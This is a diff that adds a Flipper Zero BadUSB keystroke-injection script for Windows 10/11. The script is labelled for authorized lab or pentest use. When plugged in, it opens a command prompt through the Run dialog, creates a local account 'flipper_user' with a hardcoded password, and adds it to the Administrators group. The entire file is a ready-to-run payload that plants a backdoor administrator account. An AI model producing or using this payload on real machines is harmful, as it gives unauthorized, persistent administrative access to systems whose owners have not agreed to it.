@@ -1,0 +1,24 @@
+REM ============================================================
+REM Flipper BadUSB — Create local Windows user
+REM Authorized lab / pentest use ONLY (machine you own or scope)
+REM Requires: logged-in session with admin rights (or elevated shell)
+REM ============================================================
+REM Target: Windows 10 / 11
+REM Payload: net user + Administrators group
+REM Flipper path: badusb/win_local_user.txt
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 600
+STRING cmd
+ENTER
+DELAY 900
+STRING net user flipper_user FlipperTemp123! /add
+ENTER
+DELAY 400
+STRING net localgroup Administrators flipper_user /add
+ENTER
+DELAY 400
+STRING exit
+ENTER
